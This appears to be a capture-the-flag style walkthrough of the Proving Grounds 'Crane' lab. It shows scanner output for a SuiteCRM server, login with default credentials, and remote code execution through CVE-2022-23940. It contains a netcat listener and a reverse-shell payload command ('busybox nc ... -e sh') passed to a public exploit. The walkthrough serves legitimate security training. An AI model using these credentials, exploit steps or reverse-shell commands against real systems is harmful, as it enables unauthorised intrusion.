**HyperText Transport Protocol**

# Environment Variables / Setup

```
export IP=192.168.159.146
export PORT=80
export URL=http://$IP:$PORT
```

# Phase 1: Initial Reconnaissance

## Nmap HTTP Scripts
```
nmap --script=http-enum,http-headers,http-methods,http-robots.txt,http-title -p$PORT $IP
```

```
PORT   STATE SERVICE
80/tcp open  http
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-headers:
|   Date: Sun, 24 Aug 2025 21:08:30 GMT
|   Server: Apache/2.4.38 (Debian)
|   Set-Cookie: PHPSESSID=ulcdgvlr14tj1cu1mbk4u2eu3l; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   Set-Cookie: sugar_user_theme=SuiteP; expires=Mon, 24-Aug-2026 21:08:30 GMT; Max-Age=31536000; HttpOnly
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|
|_  (Request type: HEAD)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
| http-enum:
|   /robots.txt: Robots file
|   /crossdomain.xml: Adobe Flash crossdomain policy
|   /cache/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /custom/: Potentially interesting folder
|   /data/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /include/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /install/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /lib/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /modules/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /service/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /soap/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /themes/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /upload/: Potentially interesting folder
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
```

## Technology Stack Identification

### whatweb
(From autorecon)

```
WhatWeb report for http://192.168.159.146:80
Status    : 301 Moved Permanently
Title     : <None>
IP        : 192.168.159.146
Country   : RESERVED, ZZ

Summary   : Apache[2.4.38], Cookies[PHPSESSID], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], RedirectLocation[index.php?action=Login&module=Users]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.38 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ Cookies ]
	Display the names of cookies in the HTTP headers. The
	values are not returned to save on space.

	String       : PHPSESSID

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Debian Linux
	String       : Apache/2.4.38 (Debian) (from server string)

[ RedirectLocation ]
	HTTP Server string location. used with http-status 301 and
	302

	String       : index.php?action=Login&module=Users (from location)

HTTP Headers:
	HTTP/1.1 301 Moved Permanently
	Date: Sun, 24 Aug 2025 21:07:29 GMT
	Server: Apache/2.4.38 (Debian)
	Set-Cookie: PHPSESSID=1p2dk7pre5jor9mo8hqbuirp9g; path=/
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	Location: index.php?action=Login&module=Users
	Content-Length: 0
	Connection: close
	Content-Type: text/html; charset=UTF-8

WhatWeb report for http://192.168.159.146/index.php?action=Login&module=Users
Status    : 200 OK
Title     : SuiteCRM
IP        : 192.168.159.146
Country   : RESERVED, ZZ

Summary   : Apache[2.4.38], Cookies[PHPSESSID,sugar_user_theme], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], HttpOnly[sugar_user_theme], JQuery, PasswordField[username_password], PHP, PoweredBy[SugarCRM], Script[text/javascript], X-UA-Compatible[IE=edge]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.38 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ Cookies ]
	Display the names of cookies in the HTTP headers. The
	values are not returned to save on space.

	String       : PHPSESSID
	String       : sugar_user_theme

[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Debian Linux
	String       : Apache/2.4.38 (Debian) (from server string)

[ HttpOnly ]
	If the HttpOnly flag is included in the HTTP set-cookie
	response header and the browser supports it then the cookie
	cannot be accessed through client side script - More Info:
	http://en.wikipedia.org/wiki/HTTP_cookie

	String       : sugar_user_theme

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse
	HTML documents, handle events, perform animations, and add
	AJAX.

	Website     : http://jquery.com/

[ PHP ]
	PHP is a widely-used general-purpose scripting language
	that is especially suited for Web development and can be
	embedded into HTML. This plugin identifies PHP errors,
	modules and versions and extracts the local file path and
	username if present.

	Google Dorks: (3)
	Website     : http://www.php.net/

[ PasswordField ]
	find password fields

	String       : username_password (from field name)

[ PoweredBy ]
	This plugin identifies instances of 'Powered by x' text and
	attempts to extract the value for x.

	String       : SugarCRM

[ Script ]
	This plugin detects instances of script HTML elements and
	returns the script language/type.

	String       : text/javascript

[ X-UA-Compatible ]
	This plugin retrieves the X-UA-Compatible value from the
	HTTP header and meta http-equiv tag. - More Info:
	http://msdn.microsoft.com/en-us/library/cc817574.aspx

	String       : IE=edge

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Sun, 24 Aug 2025 21:07:42 GMT
	Server: Apache/2.4.38 (Debian)
	Set-Cookie: PHPSESSID=c51j710rd36krqf3oovmpq8vj5; path=/
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	Set-Cookie: sugar_user_theme=SuiteP; expires=Mon, 24-Aug-2026 21:07:42 GMT; Max-Age=31536000; HttpOnly
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 3256
	Connection: close
	Content-Type: text/html; charset=UTF-8
```

## Quick Manual Checks

### Robots.txt & Common Files
```
curl $URL/robots.txt
	User-agent: *
	Disallow: /
	
	User-agent: Googlebot
	Allow: /ical_server.php
```

## Directory Enumeration
(From autorecon feroxbuster)

```
401      GET        1l        6w       52c http://192.168.159.146/ical_server.php
200      GET       12l       36w      335c http://192.168.159.146/include/javascript/jquery/themes/base/jquery.ui.all.css
200      GET        0l        0w        0c http://192.168.159.146/themes/SuiteP/css/colourSelector.php
200      GET       60l      285w    20393c http://192.168.159.146/cache/include/javascript/sugar_field_grp.js
200      GET       51l      364w     4698c http://192.168.159.146/modules/Users/login.js
68.159.146/vendor/
...
```

## Nikto Scan
(From autorecon)

```
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ Root page / redirects to: index.php?action=Login&module=Users
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /ical_server.php: Uncommon header 'x-webdav-status' found, with contents: 401 not authorized.
+ /ical_server.php: Uncommon header 'x-dav-powered-by' found, with contents: PHP class: HTTP_WebDAV_Server_iCal.
+ /ical_server.php: Default account found for 'SugarCRM iCal' at (ID 'admin', PW ''). Generic account discovered. See: CWE-16
+ /robots.txt: Entry '/ical_server.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /data/: Directory indexing found.
+ /data/: This might be interesting.
+ /install/: Directory indexing found.
+ /install/: This might be interesting.
+ /lib/: Directory indexing found.
+ /lib/: This might be interesting.
+ /service/: Directory indexing found.
+ /service/: This might be interesting.
+ /install.php: install.php file found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

# Manual Enumeration

## /ical_server.php
From our automated enumeration output, the /ical_server.php endpoint stood out to me. Nikto even found that default credentials (admin and blank password) were successful.

I was able to download this in my browser by using these credentials to get ical_server.ics:

```
...
SUMMARY:Communicate with internal stakeholders
UID:37b767ba-2d35-e7a5-e527-64e74535866d
DESCRIPTION:Project:Create new plan for the annual audit\r\n\r\nSchedule individual meetings with Will\, Max\, and Sarah.
URL;VALUE=URI:http://crane.offsec/index.php?module=ProjectTask&action=DetailView&record=37b767ba-2d35-e7a5-e527-64e74535866d
PERCENT-COMPLETE:100
END:VTODO
BEGIN:VTODO
DTSTART;TZID=America/New_York:19700101T000000
DTSTAMP:20250824T172500Z
SUMMARY:Create draft of the plan
UID:3a887995-4bc5-785d-fa76-64e74532e133
DESCRIPTION:Project:Create new plan for the annual audit\r\n\r\nStart new plan document\, including all of the information from the initial discussion meetings.
URL;VALUE=URI:http://crane.offsec/index.php?module=ProjectTask&action=DetailView&record=3a887995-4bc5-785d-fa76-64e74532e133
PERCENT-COMPLETE:38
END:VTODO
BEGIN:VTODO
DTSTART;TZID=America/New_York:19700101T000000
DTSTAMP:20250824T172500Z
SUMMARY:Perform field studies to collect data
UID:3ccc7d9e-1192-1271-3335-64e74583f315
DESCRIPTION:Project:Create new plan for the annual audit\r\n\r\nObtain approval from all stakeholders of the plan.
URL;VALUE=URI:http://crane.offsec/index.php?module=ProjectTask&action=DetailView&record=3ccc7d9e-1192-1271-3335-64e74583f315
PERCENT-COMPLETE:75
```

It looks like the organization is planning for an audit. This gives us some context and names to keep in mind: Will, Max, and Sarah

## SuiteCRM Admin Sign-in


![[Pasted image 20250824142327.png]]

As expected from the whatweb and nmap output, navigating to `http://192.168.159.146`  in our browser redirects us to `/index.php?module=Users&action=Login`, presenting a sign in form.

Guessing admin:admin allows us to sign in!

![[Pasted image 20250824142453.png]]

The 'About' page shows that this instance is running version SuiteCRM Version 7.12.3 and Sugar Version 6.5.25 (Build 344).

![[Pasted image 20250824143629.png]]

## Exploiting CVE-2022-23940 to Gain Initial Access

By googling this version, I found CVE-2022-23940 for authenticated remote code execution.

https://nvd.nist.gov/vuln/detail/CVE-2022-23940
https://github.com/manuelz120/CVE-2022-23940

I'll clone the PoC Github repo and give it a try. After installing the dependencies in requirements.txt, I'll start a listener...

`rlwrap nc -lnvp 1234`

and run the exploit, giving a payload which will establish a reverse shell to my listener as www-data...

`python3 exploit.py -h http://$IP:80 -u admin -p admin --payload "busybox nc 192.168.45.244 1234 -e sh"`

![[Pasted image 20250824145246.png]]

# Continue: [[Archive/OFFSEC - Proving Grounds Writeups/Linux/Crane/Privilege Escalation|Privilege Escalation]]

